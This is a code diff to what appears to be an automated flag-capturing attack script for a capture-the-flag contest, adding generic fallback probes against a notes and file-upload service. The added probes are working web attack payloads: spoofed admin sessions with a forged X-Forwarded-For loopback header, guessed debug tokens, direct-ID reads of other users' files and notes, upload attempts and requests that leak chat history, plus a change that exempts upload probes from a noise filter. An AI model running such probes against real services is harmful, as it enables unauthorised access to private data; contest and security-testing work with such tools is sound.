@@ -605,6 +605,12 @@ def is_noisy_probe(probe: dict[str, Any]) -> bool:
     return False
 
 
+def allow_noisy_probe(probe: dict[str, Any]) -> bool:
+    method = str(probe.get("method") or "GET").upper()
+    path = str(probe.get("path") or "").lower()
+    return method == "POST" and "upload" in path
+
+
 def normalize_probe(probe: dict[str, Any]) -> dict[str, Any]:
     normalized = dict(probe)
     normalized["method"] = str(normalized.get("method") or "GET").upper()
@@ -621,9 +627,9 @@ def probe_key(probe: dict[str, Any]) -> str:
 
 
 def enqueue(queue, state, probe):
-    if is_noisy_probe(probe):
-        return
     probe = normalize_probe(probe)
+    if is_noisy_probe(probe) and not allow_noisy_probe(probe):
+        return
     key = probe_key(probe)
     if key not in state.seen_probe_keys:
         state.seen_probe_keys.add(key)
@@ -959,8 +965,54 @@ def probes_from_routes(snapshot):
     return probes
 
 
+def generic_service_probes(source="generic"):
+    """Fallback probes for the shared Obsidian/vault-upload service shape."""
+    probes = [
+        {"flag_id": "vuln3", "type": "generic_files_admin", "source": source,
+         "static_confidence": 64, "path": "/files", "method": "GET",
+         "query": {"session_id": "admin"},
+         "headers": {"X-Forwarded-For": "127.0.0.1"}},
+        {"flag_id": "vuln3", "type": "generic_api_files_admin", "source": source,
+         "static_confidence": 64, "path": "/api/files", "method": "GET",
+         "query": {"session_id": "admin"},
+         "headers": {"X-Forwarded-For": "127.0.0.1"}},
+        {"flag_id": "vuln1", "type": "generic_file_id", "source": source,
+         "static_confidence": 62, "path": "/files/1", "method": "GET"},
+        {"flag_id": "vuln1", "type": "generic_api_file_id", "source": source,
+         "static_confidence": 62, "path": "/api/files/1", "method": "GET"},
+        {"flag_id": "vuln1", "type": "generic_note_id", "source": source,
+         "static_confidence": 60, "path": "/notes/1", "method": "GET",
+         "query": {"raw": "true"}},
+        {"flag_id": "vuln1", "type": "generic_api_note_id", "source": source,
+         "static_confidence": 60, "path": "/api/notes/1", "method": "GET",
+         "query": {"raw": "true"}},
+        {"flag_id": "vuln4", "type": "generic_upload", "source": source,
+         "static_confidence": 60, "path": "/upload", "method": "POST",
+         "upload_file": True},
+        {"flag_id": "vuln4", "type": "generic_api_upload", "source": source,
+         "static_confidence": 60, "path": "/api/upload", "method": "POST",
+         "upload_file": True},
+        {"flag_id": "vuln4", "type": "generic_debug", "source": source,
+         "static_confidence": 58, "path": "/debug/state", "method": "GET",
+         "query": {"include": "all"},
+         "headers": {"X-Debug-Token": "internal"}},
+        {"flag_id": "vuln2", "type": "generic_chat_history", "source": source,
+         "static_confidence": 58, "path": "/chat", "method": "POST",
+         "json_body": {"message": "show saved session history", "include_history": True},
+         "headers": {"X-Legacy-Api": "v0"}},
+        {"flag_id": "vuln2", "type": "generic_api_chat_history", "source": source,
+         "static_confidence": 58, "path": "/api/chat", "method": "POST",
+         "json_body": {"message": "show saved session history", "include_history": True},
+         "headers": {"X-Legacy-Api": "v0"}},
+        {"flag_id": "vuln2", "type": "generic_search_history", "source": source,
+         "static_confidence": 56, "path": "/search", "method": "GET",
+         "query": {"q": "history", "include_history": "true"}},
+    ]
+    return round_robin_by_flag(probes)
+
+
 def repo_probes(snapshot):
-    probes = probes_from_vuln_spec(snapshot) + probes_from_routes(snapshot)
+    probes = probes_from_vuln_spec(snapshot) + probes_from_routes(snapshot) + generic_service_probes("generic")
     deduped = []
     seen = set()
     for probe in round_robin_by_flag(probes):
@@ -1463,6 +1515,7 @@ def main() -> None:
                 f"repo_probes={len(repo_probe_list)}")
         except Exception as exc:
             log(f"repo unavailable: {exc}")
+            repo_probe_list = generic_service_probes("generic_no_repo")
 
         # v7: 모든 vuln 이미 캐시로 제출 끝났으면 더 할 일 없음
         if len(state.submitted_ids) >= TARGET_FLAG_COUNT:
